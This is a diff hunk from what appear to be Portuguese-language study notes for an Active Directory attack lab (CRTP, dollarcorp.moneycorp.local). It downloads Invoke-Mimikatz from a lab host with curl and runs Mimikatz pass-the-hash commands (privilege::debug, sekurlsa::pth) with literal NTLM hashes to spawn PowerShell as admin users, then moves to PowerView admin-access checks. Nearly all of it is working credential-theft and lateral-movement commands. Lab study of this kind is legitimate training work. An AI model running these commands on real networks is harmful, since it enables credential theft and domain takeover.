@@ -2685,6 +2685,10 @@ curl http://172.16.99.209/oscp/crtp/Invoke-Mimikatz.ps1 -outfile Invoke-Mimikatz
 Import-Module .\Invoke-Mimikatz.ps1
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local /ntlm:a98e18228819e8eec3dfa33cb68b0728 /run:powershell.exe"'
 ```
+```
+Privilege::debug
+sekurlsa::pth /user:ciadmin /domain:dollarcorp.moneycorp.local /ntlm:e08253add90dccf1a208523d02998c3d /run:powershell.exe
+```
 VERIFICAR SE O USUARIO É ADMINISTRADOR LOCAL EM ALGUMA OUTRA MAQUINA:
 ```
 Import-module .\PowerView.ps1
